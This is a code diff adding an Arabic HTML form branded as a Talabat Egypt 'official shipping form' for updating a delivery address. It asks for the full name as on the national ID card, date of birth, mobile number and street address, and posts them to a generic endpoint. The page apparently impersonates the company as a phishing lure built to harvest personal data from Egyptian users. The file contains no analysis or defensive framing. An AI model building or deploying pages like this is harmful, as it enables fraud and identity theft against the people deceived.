@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث عنوان التوصيل | طلبات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>body { font-family: 'Cairo', sans-serif; }</style>
+</head>
+<body class="bg-[#F8F9FA] min-h-screen flex flex-col justify-between text-[#333333]">
+
+    <header class="bg-[#FFFFFF] shadow-sm p-4 flex items-center max-w-md mx-auto w-full border-b border-[#E9ECEF]">
+        <div class="flex items-center gap-2">
+            <span class="text-2xl font-extrabold text-[#FF5A00] tracking-tight">talabat</span>
+            <span class="text-xs text-gray-500 font-semibold mt-2 mr-1">| استمارة الشحن الرسمية</span>
+        </div>
+    </header>
+
+    <main class="flex-grow px-4 py-6 max-w-md mx-auto w-full">
+        <h1 class="text-lg font-bold text-[#111111] mb-4 text-right">إضافة تفاصيل عنوان الشحن لحسابكم</h1>
+
+        <form action="/submit-data" method="POST" class="space-y-4 bg-[#FFFFFF] border border-[#E9ECEF] rounded-xl p-5 shadow-sm text-right">
+
+            <!-- حقل الدولة الثابت -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">الدولة / المنطقة</label>
+                <select name="country" class="w-full px-3 py-2 bg-[#F8F9FA] border border-gray-300 rounded-lg text-sm text-gray-500 focus:outline-none">
+                    <option value="EG">جمهورية مصر العربية (Egypt)</option>
+                </select>
+            </div>
+
+            <!-- حقل الاسم الرباعي -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">الاسم الكامل (كما هو مدون في بطاقة الرقم القومي)</label>
+                <input type="text" name="username" required placeholder="مثال: أحمد محمد علي حسن"
+                       class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF5A00]">
+            </div>
+
+            <!-- حقل تاريخ الميلاد للتحقق القانوني -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">تاريخ الميلاد (للتحقق من السن القانوني للحساب)</label>
+                <div class="grid grid-cols-3 gap-2" dir="ltr">
+                    <input type="tel" name="dob_year" required maxlength="4" placeholder="السنة (YYYY)"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF5A00]">
+                    <input type="tel" name="dob_month" required maxlength="2" placeholder="الشهر (MM)"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF5A00]">
+                    <input type="tel" name="dob_day" required maxlength="2" placeholder="اليوم (DD)"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF5A00]">
+                </div>
+            </div>
+
+            <!-- حقل رقم الهاتف الرسمي -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">رقم الهاتف المحمول (الخاص بالتسليم)</label>
+                <div class="relative flex items-center">
+                    <input type="tel" name="phone" required placeholder="01XXXXXXXXX" dir="ltr"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-right focus:outline-none focus:border-[#FF5A00]">
+                </div>
+                <p class="text-[10px] text-gray-400 mt-1">سيتم استخدامه بواسطة ممثل التوصيل (talabat GO) للتنسيق قبل الوصول.</p>
+            </div>
+
+            <!-- حقول تفاصيل الشارع والعقار -->
+            <div>
+                <label class="block text-xs font-bold text-gray-600 mb-1">تفاصيل عنوان الشارع والحي</label>
+                <input type="text" name="address_line1" required placeholder="اسم الشارع، رقم العمارة أو الفيلا، اسم المنطقة"
+                       class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm mb-2 focus:outline-none focus:border-[#FF5A00]">
+                <input type="text" name="address_line2" placeholder="رقم الدور، رقم الشقة، علامة مميزة (اختياري)"
+                       class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF5A00]">
+            </div>
+
+            <!-- تفاصيل التقسيم الجغرافي والرمز البريدي -->
+            <div class="grid grid-cols-3 gap-2">
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">المحافظة</label>
+                    <input type="text" name="state" required placeholder="مثال: القاهرة"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF5A00]">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">المدينة / المركز</label>
+                    <input type="text" name="city" required placeholder="مثال: مصر الجديدة"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#FF5A00]">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 mb-1">الرمز البريدي</label>
+                    <input type="text" name="zipcode" required placeholder="11511" dir="ltr"
+                           class="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-center focus:outline-none focus:border-[#FF5A00]">
+                </div>
+            </div>
+
+            <div class="pt-2">
+                <button type="submit" class="w-full bg-[#FF5A00] hover:bg-[#E04F00] text-[#FFFFFF] font-bold py-3 px-4 rounded-lg text-sm shadow-sm transition-all duration-200 active:scale-[0.99]">
+                    حفظ العنوان ومتابعة الشحن
+                </button>
+            </div>
+        </form>
+    </main>
+
+    <footer class="bg-[#F8F9FA] border-t border-[#E9ECEF] py-5 text-center text-[11px] text-gray-500 w-full mt-auto">
+        <div class="max-w-md mx-auto px-4">
+            <div class="flex justify-center gap-4 mb-2">
+                <a href="/user-agreement" class="hover:underline hover:text-[#FF5A00]">شروط الاستخدام</a>
+                <a href="/privacy-policy" class="hover:underline hover:text-[#FF5A00]">سياسة الخصوصية</a>
+                <a href="/contact-us" class="hover:underline hover:text-[#FF5A00]">مركز المساعدة</a>
+            </div>
+            <p dir="ltr">&copy; 2026 Talabat Egypt. All rights reserved.</p>
+        </div>
+    </footer>
+
+</body>
+</html>
